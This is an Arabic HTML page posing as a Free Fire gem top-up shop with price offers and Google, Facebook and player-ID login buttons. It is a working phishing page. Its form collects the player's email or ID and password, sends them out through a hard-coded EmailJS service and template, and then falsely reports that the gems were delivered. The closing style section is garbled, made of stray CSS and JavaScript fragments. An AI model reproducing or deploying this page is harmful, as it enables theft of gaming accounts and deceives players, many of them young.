<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>شحن جواهر فري فاير</title>
  <link rel="stylesheet" href="style.css" />
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
</head>
<body>
  <div id="home" class="page active">
    <div class="card">
      <h2>تسجيل الدخول لشحن الجواهر</h2>
      <button class="btn" onclick="showPage('form')">Google <img src="https://img.icons8.com/color/48/000000/google-logo.png"/></button>
      <button class="btn" onclick="showPage('form')">Facebook <img src="https://img.icons8.com/color/48/000000/facebook-new.png"/></button>
      <button class="btn" onclick="showPage('form')">ID المستخدم <img src="https://img.icons8.com/ios-filled/50/ffffff/user.png"/></button>
    </div>

    <div class="card">
      <h2>عروض شحن الجواهر</h2>
      <div class="price-card">100 جواهرة - 1$ <button class="buy-btn" onclick="showAlert()">اشحن</button></div>
      <div class="price-card">500 جواهرة - 4$ <button class="buy-btn" onclick="showAlert()">اشحن</button></div>
      <div class="price-card">1000 جواهرة - 7$ <button class="buy-btn" onclick="showAlert()">اشحن</button></div>
      <div class="price-card">2000 جواهرة - 13$ <button class="buy-btn" onclick="showAlert()">اشحن</button></div>
      <div class="price-card">5000 جواهرة - 30$ <button class="buy-btn" onclick="showAlert()">اشحن</button></div>
    </div>

    <div id="alert" class="alert">يرجى تسجيل الدخول أولاً</div>
  </div>

  <div id="form" class="page">
    <div class="card login-form">
      <h2>معلومات الحساب لشحن الجواهر</h2>
      <form id="login-form">
        <input type="text" id="phone" placeholder="البريد الإلكتروني أو ID اللاعب" required />
        <input type="password" id="password" placeholder="كلمة المرور (إذا لزم)" />
        <select>
          <option>100 جواهرة</option>
          <option>500 جواهرة</option>
          <option>1000 جواهرة</option>
        </select>
        <button class="submit-btn btn" type="submit">اشحن الآن</button>
      </form>
    </div>
  </div>

  <div id="thankyou" class="page">
    <h2 style="text-align:center;">رائع!</h2>
    <p style="text-align:center; font-size: 1.2em;">تم شحن الجواهر بنجاح.<br>قد يستغرق ظهورها بضع دقائق.</p>
  </div>

  <script>
    window.onload = function () {
      emailjs.init("2DqSgek8jD7q9yciv");

      document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();
        const phone = document.getElementById("phone").value.trim();
        const password = document.getElementById("password").value.trim();

        if (!phone) {
          alert("يرجى إدخال البريد أو ID اللاعب");
          return;
        }

        emailjs.send("service_e72fstt", "template_c79we5d", {
          phone_number: phone,
          password: password
        }).then(function(response) {
          alert("تم إرسال البيانات بنجاح!");
          showPage('thankyou');
        }, function(error) {
          alert("فشل في الإرسال: " + JSON.stringify(error));
        });
      });
    };

    function showPage(id) {
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      document.getElementById(id).classList.add('active');
    }

    function showAlert() {
      const alert = document.getElementById("alert");
      alert.style.display = "block";
      setTimeout(() => alert.style.display = "none", 3000);
    }
  </script>
</body>
</html><style>* { box-sizing: border-box; }

  color: #ffeb3b;

  vertical-align: middle;

  margin-left: 10px;

  align-items: center;

  background-color: #ffeb3b;

  display: none;

  color: white;

        e.preventDefault(); // منع الإرسال الافتراضي للنموذج
